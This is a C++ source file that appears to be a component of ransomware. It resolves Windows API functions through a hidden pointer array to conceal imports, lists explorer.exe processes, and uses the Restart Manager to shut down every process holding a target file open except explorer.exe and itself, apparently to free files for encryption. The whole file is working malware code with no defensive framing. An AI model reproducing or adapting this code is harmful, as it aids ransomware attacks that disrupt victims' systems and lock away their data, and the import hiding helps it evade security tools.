#include "File.h"

EXPL_NODE* EXPLORER_ID_LL = NULL;

extern FARPROC APIArray[52];

MemeCreateToolhelp32Snapshot TempCreateToolhelp32Snapshot;
MemeProcess32FirstW TempProcess32FirstW;
MemelstrcmpiW TemplstrcmpiW;
MemeProcess32NextW TempProcess32NextW;
MemeCloseHandle TempCloseHandle1;
MemeMultiByteToWideChar TempMultiByteToWideChar;
MemeRmStartSession TempRmStartSession;
MemeRmRegisterResources TempRmRegisterResources;
MemeRmGetList TempRmGetList;
MemeGetCurrentProcess TempGetCurrentProcess;
MemeGetProcessId TempGetProcessId;
MemeRmShutdown TempRmShutdown;
MemeRmEndSession TempRmEndSession;

void populateAPIFile() {
	TempCreateToolhelp32Snapshot = (MemeCreateToolhelp32Snapshot)APIArray[17];
	TempProcess32FirstW = (MemeProcess32FirstW)APIArray[18];
	TemplstrcmpiW = (MemelstrcmpiW)APIArray[19];
	TempProcess32NextW = (MemeProcess32NextW)APIArray[20];
	TempCloseHandle1 = (MemeCloseHandle)APIArray[10];
	TempMultiByteToWideChar = (MemeMultiByteToWideChar)APIArray[21];
	TempRmStartSession = (MemeRmStartSession)APIArray[44];
	TempRmRegisterResources = (MemeRmRegisterResources)APIArray[45];
	TempRmGetList = (MemeRmGetList)APIArray[46];
	TempGetCurrentProcess = (MemeGetCurrentProcess)APIArray[22];
	TempGetProcessId = (MemeGetProcessId)APIArray[23];
	TempRmShutdown = (MemeRmShutdown)APIArray[47];
	TempRmEndSession = (MemeRmEndSession)APIArray[48];
}

void addNode(DWORD id) {
	EXPL_NODE* tempNode = (EXPL_NODE*)calloc(sizeof(EXPL_NODE), 1);

	if (!tempNode) {
		return;
	}
	tempNode->id = id;
	tempNode->nextNode = NULL;
	if (!EXPLORER_ID_LL) {
		EXPLORER_ID_LL = tempNode;
	}
	else {
		tempNode->nextNode = EXPLORER_ID_LL;
		EXPLORER_ID_LL = tempNode;
	}
}

void cleanExplorerLL() {
	EXPL_NODE* head = EXPLORER_ID_LL;

	while (head) {
		EXPL_NODE* temp = head->nextNode;
		free(head);
		head = temp;
	}
}

void findExplorerExe() {
	if (!TempCreateToolhelp32Snapshot) {
		populateAPIFile();
	}
	HANDLE hSnapshot = TempCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	PROCESSENTRY32W procEntry = PROCESSENTRY32W();
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		procEntry.dwSize = sizeof(PROCESSENTRY32W);
		if (TempProcess32FirstW(hSnapshot, &procEntry)) {
			do {
				if (!TemplstrcmpiW(procEntry.szExeFile, L"explorer.exe")) { // found explorer
					addNode(procEntry.th32ProcessID);
				}
			} while (TempProcess32NextW(hSnapshot, &procEntry));
		}
		TempCloseHandle1(hSnapshot);
	}
}

// make sure findExplorerExe is called already
// Kill all except explorer.exe
void killFileOwner(LPSTR fileName) {
	if (!TempCreateToolhelp32Snapshot) {
		populateAPIFile();
	}
	DWORD sessionHandle = 0xFFFFFFFF;

	WCHAR* strSessionKey = NULL;
	int convertResult = 0;
	UINT procInfoNeeded = 0;
	UINT procInfo = 0;
	DWORD dwRebootReasons = 0;
	RM_PROCESS_INFO* rgAffectedApps = NULL;
	RM_PROCESS_INFO* affectedApp = NULL;
	HANDLE hCurrentProcess = NULL;
	DWORD dwCurrentProcessID = 0;
	EXPL_NODE* currNode = NULL;
	DWORD counter = 0;
	DWORD result = 0;

	convertResult = TempMultiByteToWideChar(CP_UTF8, 0, fileName, -1, NULL, 0);
	LPWSTR wFileName = (LPWSTR)calloc(convertResult, sizeof(WCHAR));
	if (!wFileName) {
		goto CLEANUP;
	}

	convertResult = TempMultiByteToWideChar(CP_UTF8, 0, fileName, convertResult, wFileName, convertResult);
	if (convertResult <= 0) {
		goto CLEANUP;
	}

	strSessionKey = (WCHAR*)calloc(0x42, 1);

	if (!strSessionKey) {
		goto CLEANUP;
	}

	if (TempRmStartSession(&sessionHandle, 0, strSessionKey) != ERROR_SUCCESS) {
		goto CLEANUP;
	}

	if (TempRmRegisterResources(sessionHandle, 1, (LPCWSTR*)&wFileName, 0, NULL, 0, NULL) != ERROR_SUCCESS) {
		goto CLEANUP;
	}

	result = TempRmGetList(sessionHandle, &procInfoNeeded, &procInfo, NULL, &dwRebootReasons);

	if ((result == ERROR_MORE_DATA) && procInfoNeeded) {
		rgAffectedApps = (RM_PROCESS_INFO*)malloc(sizeof(RM_PROCESS_INFO) * procInfoNeeded);
		if (!rgAffectedApps) {
			goto CLEANUP;
		}
		procInfo = procInfoNeeded;
		if (TempRmGetList(sessionHandle, &procInfoNeeded, &procInfo, rgAffectedApps, &dwRebootReasons) || !procInfoNeeded) {
			goto CLEANUP;
		}

		hCurrentProcess = TempGetCurrentProcess();

		dwCurrentProcessID = TempGetProcessId(hCurrentProcess);

		if (procInfo) {
			affectedApp = rgAffectedApps;

			while (affectedApp->Process.dwProcessId != dwCurrentProcessID) {
				currNode = EXPLORER_ID_LL;

				if (currNode) {
					while (affectedApp->Process.dwProcessId != currNode->id) {
						currNode = currNode->nextNode;
						if (!currNode) {
							goto MOVEON;
						}
					}
					break;
				}
			MOVEON:
				counter++;
				affectedApp++;
				if (counter >= procInfo) {
					goto SHUTDOWN2;
				}
			}
			goto CLEANUP;
		}
	SHUTDOWN2:
		TempRmShutdown(sessionHandle, 1, 0);
		goto CLEANUP;
	}

CLEANUP:
	if (hCurrentProcess) {
		TempCloseHandle1(hCurrentProcess);
	}

	if (rgAffectedApps) {
		free(rgAffectedApps);
	}

	TempRmEndSession(sessionHandle);

	if (wFileName) {
		free((void*)wFileName);
	}
	if (strSessionKey) {
		free(strSessionKey);
	}
}